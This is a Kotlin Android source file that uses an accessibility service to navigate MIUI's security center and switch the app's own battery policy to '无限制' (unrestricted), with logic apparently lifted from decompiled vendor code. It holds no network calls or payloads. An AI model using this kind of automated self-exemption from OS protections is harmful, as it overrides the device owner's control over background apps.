package com.storm.safe.rock.service.modules.yw5xud.miui

import android.content.ComponentName
import android.content.Intent
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.auto.a11y.UiAutomation
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.yw5xud.common.UiDebugger

/**
 * MiuiPowerStrategy -- Phase 2 power/battery strategy delegate.
 * Opens ApplicationsDetailsActivity, clicks "省电策略" entry, then selects "无限制".
 *
 * Vendor C0367a4.m212261c0 step 13.5 (POWER_STRATEGY).
 * Extracted from MiuiSteps.executePowerStrategy().
 */
class MiuiPowerStrategy(
    private val service: MyAccessibilityService?,
    private val context: android.content.Context,
    private val ui: UiAutomation,
    private val steps: MiuiSteps
) {
    companion object {
        private const val TAG = "MiuiPowerStrategy"
    }

    /**
     * Power strategy: open ApplicationsDetailsActivity -> click "省电策略" -> 电量详情 page -> click "无限制".
     *
     * Vendor C0367a4.m212261c0 step 13.5 (POWER_STRATEGY):
     *   1. Open ApplicationsDetailsActivity via m212275d9() (securitycenter or standard Settings fallback)
     *   2. On app detail page, find "省电策略" text and click it -> navigates to "电量详情" page
     *   3. On 电量详情 page, scroll down to "省电策略" section, find "无限制" (CheckedTextView) and click
     *   4. Verify checked state
     *
     * Real MIUI 15 UI dump confirms:
     *   - App detail page entry text: "省电策略" (NOT "电量使用详情")
     *   - Target page title: "电量详情" (com.miui.securitycenter)
     *   - Target option: "无限制" (CheckedTextView, android:id/title)
     */
    suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        try {
            UiDebugger.logStep(TAG, "Phase2: executePowerStrategy begin")

            // Step 1: Open ApplicationsDetailsActivity (vendor m212275d9)
            val launched = openApplicationsDetailsActivity()

            if (!launched) {
                // Fallback: try HiddenAppsConfigActivity (vendor C0364a1 approach)
                Log.i(TAG, "[省电策略] ApplicationsDetailsActivity 打开失败，尝试 HiddenAppsConfigActivity")
                val fallbackLaunched = ui.launchComponent(MiuiConstants.BATTERY_COMPONENTS, useService = true)
                if (fallbackLaunched) {
                    steps.interruptibleDelay(2000L)
                    steps.waitForPageStable()
                    clickUnrestrictedOption(successes, failures, logs)
                } else {
                    logs.add("[省电策略] 所有启动方式均失败，跳过省电策略")
                }
                return
            }

            logs.add("[省电策略] 已打开应用详情页")
            steps.interruptibleDelay(1500L)
            steps.waitForPageStable()
            UiDebugger.dumpPage(service, "miui_phase2_app_detail", "省电策略-应用详情页")

            // Step 2: Click "省电策略" entry on app detail page to enter 电量详情 page
            UiDebugger.dumpPage(service, "miui_phase2_find_power_strategy", "搜索省电策略入口")
            val enteredPowerPage = clickPowerStrategyEntry()

            if (!enteredPowerPage) {
                logs.add("[省电策略] 未找到省电策略入口，跳过")
                return
            }

            // Step 3: Wait for 电量详情 page to load
            steps.interruptibleDelay(1500L)
            steps.waitForPageStable()
            UiDebugger.dumpPage(service, "miui_phase2_battery_detail", "电量详情页")

            // Step 4: On 电量详情 page, click "无限制"
            clickUnrestrictedOption(successes, failures, logs)

            // Step 5: 点击页面左上角的 "返回" 按钮（id=com.miui.securitycenter:id/up）
            steps.interruptibleDelay(500L)
            val clicked = ui.clickSelector("[id=\"com.miui.securitycenter:id/up\"]")
            if (clicked) {
                Log.i(TAG, "[省电策略] 点击页面返回按钮")
                steps.interruptibleDelay(800L)
                steps.waitForPageStable()
            } else {
                Log.w(TAG, "[省电策略] 未找到页面返回按钮 (id=up)，跳过返回")
            }

        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            Log.e(TAG, "[省电策略] 异常: ${e.message}", e)
            failures.add("小米省电策略异常: ${e.message}")
        }
    }

    /**
     * Try clicking power strategy entry using keyword lists.
     * Primary: POWER_STRATEGY_ENTRY_KEYWORDS, Secondary: BATTERY_DETAIL_KEYWORDS,
     * Last resort: scroll down and retry both keyword lists.
     */
    private suspend fun clickPowerStrategyEntry(): Boolean {
        // Primary: try "省电策略" keywords first (matches real MIUI 15 UI)
        for (keyword in MiuiConstants.POWER_STRATEGY_ENTRY_KEYWORDS) {
            if (ui.clickSelector("[text=\"$keyword\"][visibleToUser=true]")) {
                Log.i(TAG, "[省电策略] 点击省电策略入口: $keyword")
                return true
            }
        }

        // Secondary fallback: try "电量使用详情" keywords (older MIUI versions)
        for (keyword in MiuiConstants.BATTERY_DETAIL_KEYWORDS) {
            if (ui.clickSelector("[text=\"$keyword\"][visibleToUser=true]")) {
                Log.i(TAG, "[省电策略] 点击电量详情入口(fallback): $keyword")
                return true
            }
        }

        // Last resort: scroll down and try all keywords again
        ui.scrollForward()
        steps.interruptibleDelay(500L)
        for (keyword in MiuiConstants.POWER_STRATEGY_ENTRY_KEYWORDS + MiuiConstants.BATTERY_DETAIL_KEYWORDS) {
            if (ui.clickSelector("[text=\"$keyword\"][visibleToUser=true]")) {
                Log.i(TAG, "[省电策略] 滚动后找到入口: $keyword")
                return true
            }
        }

        return false
    }

    /**
     * Open ApplicationsDetailsActivity. Vendor m212275d9:
     * 1. Try com.miui.securitycenter -> com.miui.appmanager.ApplicationsDetailsActivity
     * 2. Fallback to android.settings.APPLICATION_DETAILS_SETTINGS
     */
    private fun openApplicationsDetailsActivity(): Boolean {
        try {
            val intent = Intent().apply {
                component = ComponentName(
                    "com.miui.securitycenter",
                    "com.miui.appmanager.ApplicationsDetailsActivity"
                )
                putExtra("package_name", context.packageName)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            }
            (service ?: context).startActivity(intent)
            Log.i(TAG, "[省电策略] 安全中心应用详情已打开")
            return true
        } catch (e: Exception) {
            Log.w(TAG, "[省电策略] 安全中心打开失败: ${e.message}，尝试标准方式")
        }
        try {
            val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = android.net.Uri.parse("package:${context.packageName}")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            }
            (service ?: context).startActivity(intent)
            Log.i(TAG, "[省电策略] 标准应用详情已打开")
            return true
        } catch (e: Exception) {
            Log.e(TAG, "[省电策略] 标准方式也失败: ${e.message}")
        }
        return false
    }

    /**
     * Click the "无限制" option on the 电量详情/省电策略 page.
     * Vendor approach: dh0.f55766b6 keyword list, checks parent isChecked/isSelected,
     * coordinate-based click fallback.
     */
    private suspend fun clickUnrestrictedOption(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        // First try without scrolling
        if (tryClickUnrestricted()) {
            successes.add("小米省电策略已设置为无限制")
            Log.i(TAG, "[省电策略] 已点击无限制")
            return
        }

        // Scroll down and retry (radio buttons may be below fold in 电量详情)
        for (attempt in 0 until MiuiConstants.MAX_SCROLL_ATTEMPTS) {
            if (!ui.scrollForward()) break
            steps.interruptibleDelay(500L)

            if (tryClickUnrestricted()) {
                successes.add("小米省电策略已设置为无限制")
                Log.i(TAG, "[省电策略] 滚动后已点击无限制")
                return
            }
        }

        logs.add("[省电策略] 未找到无限制选项")
    }

    /**
     * Try to find and click "无限制" on current page.
     * Vendor pattern from C0364a1 lines 3290-3336.
     */
    private fun tryClickUnrestricted(): Boolean {
        for (keyword in MiuiConstants.BATTERY_NO_RESTRICT_KEYWORDS) {
            val nodes = ui.queryAll("[text*=\"$keyword\"][visibleToUser=true]")
            if (nodes.isEmpty()) continue

            for (node in nodes) {
                // Check if already selected (vendor: walk up 3 parent levels for isChecked/isSelected)
                var parent: AccessibilityNodeInfo? = node.parent
                var alreadySelected = false
                for (depth in 0 until 3) {
                    if (parent == null) break
                    if (parent.isChecked || parent.isSelected) {
                        Log.i(TAG, "[省电策略] '$keyword' 已经是选中状态")
                        alreadySelected = true
                        break
                    }
                    parent = parent.parent
                }

                // Also check the node itself (CheckedTextView has isChecked directly)
                if (!alreadySelected && node.isChecked) {
                    Log.i(TAG, "[省电策略] '$keyword' 节点自身已选中")
                    alreadySelected = true
                }

                if (alreadySelected) {
                    return true  // Already unrestricted, count as success
                }

                // Click via coordinate tap (vendor: getBounds -> centerX, centerY -> gesture tap)
                if (ui.click(node)) {
                    Log.i(TAG, "[省电策略] 已点击 '$keyword'")
                    return true
                }
            }
        }
        return false
    }
}
